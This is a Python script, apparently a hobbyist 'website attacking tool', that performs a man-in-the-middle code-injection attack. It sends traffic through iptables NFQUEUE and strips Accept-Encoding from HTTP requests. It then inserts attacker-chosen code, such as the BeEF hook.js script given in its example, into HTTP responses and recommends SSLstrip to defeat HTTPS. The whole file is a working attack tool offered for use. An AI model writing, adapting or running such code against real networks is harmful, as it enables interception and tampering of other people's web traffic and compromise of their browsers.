#!/usr/vin/env python
import netfilterqueue
import scapy.all as scapy
import re
import subprocess
import os

# run " pip install netfilterqueue  "
# in order to
# get the script working


def print_creds():
    print("J3wker | Code Injector | Website Attacking Tools\n")
    print("\t\t(0_0)")
    print("----------------")


def net_queue(queue_num, process):
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(queue_num, process)
    queue.run()


def tables_setup():
    os.system("iptables -I INPUT -j NFQUEUE --queue-num 0")
    os.system("iptables -I OUTPUT -j NFQUEUE --queue-num 0")
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")


def set_load(packet, loadf):
    packet[scapy.Raw].load = loadf
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] Request")
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)

        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+] Response")
            load = scapy_packet[scapy.Raw].load.replace("</body>", injection_code + "</body>")
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                new_conetnt_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_conetnt_length))

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(str(new_packet))
    packet.accept()


try:
    print_creds()
    print('Example: <script src="http://127.0.0.1:3000/hook.js"></script>\n')
    print("NOTE: Working ONLY on HTTP websites - use SSLSTRIP before lunching the program")
    injection_code = raw_input("Injection Code -> ")
    tables_setup()
    net_queue(0, process_packet)
except KeyboardInterrupt:
    subprocess.call(["iptables", "--flush"])
    print("\n\nDetected CTRL + C Quitting program...")
